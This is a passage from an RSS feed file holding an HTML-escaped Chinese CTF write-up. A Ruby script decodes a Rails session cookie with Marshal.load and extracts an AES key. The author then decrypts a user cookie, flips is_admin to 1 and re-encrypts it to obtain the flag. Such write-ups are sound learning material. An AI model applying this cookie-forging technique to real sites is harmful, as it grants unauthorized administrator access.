&amp;#34;BAh7B0kiD3Nlc3Npb25faWQGOgZFVEkiRTBiNDJlNTgzNjJjOWFjNjU5NzJm%0ANzAwYmMxODczZTlkYzBiY2ZkMGI3NGZlYzE4NjBhNWRmNGY3NTg2NDg4NjkG%0AOwBGSSIMYWVzX2tleQY7AEYiJa5eOeNVt5U3U6b2OYRb%2Bz2Do4Uxpnpqkw5L%0AM%2BRPHR46%0A&amp;#34;&#xA;&#xA;decoded_uri = URI.decode_www_form_component(encoded_string)&#xA;decoded_base64 = Base64.decode64(decoded_uri)&#xA;puts decoded_base64&#xA;begin&#xA;  object = Marshal.load(decoded_base64)&#xA;  pp object&#xA;rescue ArgumentError =&amp;gt; e&#xA;  puts &amp;#34;ERROR: &amp;#34;+e.to_s&#xA;end&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;改改，运行&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;ruby test.rb&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;看到&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;{I&amp;#34;session_id:ETI&amp;#34;E0b42e58362c9ac65972f700bc1873e9dc0bcfd0b74fec1860a5df4f758648869;FI&amp;#34;&#xA;aes_key;F&amp;#34;%�^9�U��7S��9�[�=���1�zj�K3�O:&#xA;{&amp;#34;session_id&amp;#34;=&amp;gt;&amp;#34;0b42e58362c9ac65972f700bc1873e9dc0bcfd0b74fec1860a5df4f758648869&amp;#34;,&#xA; &amp;#34;aes_key&amp;#34;=&amp;gt;&amp;#34;\xAE^9\xE3U\xB7\x957S\xA6\xF69\x84[\xFB=\x83\xA3\x851\xA6zj\x93\x0EK3\xE4O\x1D\x1E:&amp;#34;}&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;aes key考虑一波解密，把密钥base64一下或者hex，试了上面的session_id 解不开&lt;/p&gt;&#xA;&lt;p&gt;想到返回包中还有一个user cookie，得到&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;{&amp;#34;first_name&amp;#34;:&amp;#34;123&amp;#34;,&amp;#34;last_name&amp;#34;:&amp;#34;123&amp;#34;,&amp;#34;is_admin&amp;#34;:0}&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;开了，直接该is_admin=1,在加密回hex发包回去&lt;/p&gt;&#xA;&lt;p&gt;get flag&lt;/p&gt;</description>
+    </item>
+  </channel>
+</rss>
